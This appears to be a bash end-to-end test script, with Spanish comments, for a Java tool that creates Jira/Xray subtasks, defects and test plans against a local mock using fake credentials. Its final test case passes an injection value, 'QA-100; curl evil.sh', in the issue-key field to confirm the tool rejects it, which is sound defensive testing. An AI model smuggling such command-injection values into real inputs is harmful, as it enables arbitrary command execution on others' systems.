#!/usr/bin/env bash
# E2E: levanta el mock, ejecuta las 3 operaciones y valida los reportes.
# Uso local:  mvn package && ./scripts/e2e-mock.sh
set -euo pipefail
cd "$(dirname "$0")/.."

JAR="${JAR:-target/qe-helper.jar}"
PORT="${PORT:-8089}"
OUT="target/e2e"
mkdir -p "$OUT"

# Credenciales ficticias: el mock y la app reciben lo mismo, como harían desde Secrets/Vault.
export MOCK_JIRA_EMAIL="svc-qe@example.com" MOCK_JIRA_TOKEN="ci-jira-token"
export MOCK_XRAY_CLIENT_ID="ci-xray-id" MOCK_XRAY_CLIENT_SECRET="ci-xray-secret"

python3 mock/jira_xray_mock.py --port "$PORT" > "$OUT/mock.log" 2>&1 &
MOCK_PID=$!
trap 'kill $MOCK_PID 2>/dev/null || true' EXIT
for _ in $(seq 1 30); do curl -sf "http://127.0.0.1:$PORT/health" >/dev/null && break; sleep 0.3; done

BASE=(JIRA_BASE_URL="http://127.0.0.1:$PORT" XRAY_BASE_URL="http://127.0.0.1:$PORT"
      JIRA_EMAIL="$MOCK_JIRA_EMAIL" JIRA_API_TOKEN="$MOCK_JIRA_TOKEN"
      XRAY_CLIENT_ID="$MOCK_XRAY_CLIENT_ID" XRAY_CLIENT_SECRET="$MOCK_XRAY_CLIENT_SECRET")

PASS=0; FAIL=0
# run <nombre> <exit esperado> <python-assert sobre r (reporte)> VAR=valor...
run() {
  local name="$1" expect="$2" check="$3"; shift 3
  echo; echo "━━ $name"
  set +e
  env "${BASE[@]}" QE_REPORT_PATH="$OUT/$name.json" "$@" java -jar "$JAR"
  local code=$?
  set -e
  if [[ "$code" != "$expect" ]]; then
    echo "✗ $name: exit $code, esperado $expect"; FAIL=$((FAIL+1)); return
  fi
  if python3 -I -c "import json,sys; r=json.load(open(sys.argv[1])); s=[x['status'] for x in r['results']]; assert $check, (s, r.get('error'))" "$OUT/$name.json"; then
    echo "✓ $name"; PASS=$((PASS+1))
  else
    echo "✗ $name: aserción fallida"; FAIL=$((FAIL+1))
  fi
}

run subtasks-all      0 "s.count('CREATED')==9" \
    QE_OPERATION=create-subtasks QE_ISSUE_KEY=QA-100 QE_SUBTASKS=ALL
run subtasks-idempot  0 "s.count('SKIPPED')==9 and 'CREATED' not in s" \
    QE_OPERATION=create-subtasks QE_ISSUE_KEY=QA-100 QE_SUBTASKS=ALL
run subtasks-subset   0 "s.count('CREATED')==2" \
    QE_OPERATION=create-subtasks QE_ISSUE_KEY=QA-101 QE_SUBTASKS="diseno, FUNCIONAL"
run defect            0 "s==['CREATED']" \
    QE_OPERATION=create-defect QE_ISSUE_KEY=QA-100 QE_SUMMARY="Huella no reconocida en Android 14" \
    QE_DESCRIPTION='Pasos:\n1. Registrar huella\n2. Cerrar sesión\n3. Login con huella'
run testplan-keys     0 "s==['CREATED','INFO'] and r['results'][1]['summary'].startswith('3 ')" \
    QE_OPERATION=create-test-plan QE_ISSUE_KEY=QA-100 QE_SUMMARY="TP Sprint 42 - Biometría" QE_TESTS="QA-201,QA-202,qa-203"
run testplan-jql      0 "s==['CREATED','INFO'] and r['results'][1]['summary'].startswith('5 ')" \
    QE_OPERATION=create-test-plan QE_ISSUE_KEY=QA-100 QE_SUMMARY="TP Regresión" QE_TESTS="jql:project = QA AND issuetype = Test"
run dry-run           0 "s==['DRY_RUN'] and r['dryRun']" \
    QE_OPERATION=create-defect QE_ISSUE_KEY=QA-100 QE_SUMMARY="No debería crearse" DRY_RUN=true
run bad-token         1 "'401' in r['error']" \
    QE_OPERATION=create-defect QE_ISSUE_KEY=QA-100 QE_SUMMARY="x" JIRA_API_TOKEN=token-equivocado
run missing-secret    1 "'JIRA_API_TOKEN' in r['error']" \
    QE_OPERATION=create-defect QE_ISSUE_KEY=QA-100 QE_SUMMARY="x" JIRA_API_TOKEN=
run issue-not-found   1 "'404' in r['error']" \
    QE_OPERATION=create-subtasks QE_ISSUE_KEY=QA-999
run invalid-input     1 "'inválido' in r['error']" \
    QE_OPERATION=create-subtasks QE_ISSUE_KEY='QA-100; curl evil.sh'

echo; echo "E2E: $PASS ok, $FAIL fallidos"
[[ $FAIL -eq 0 ]]
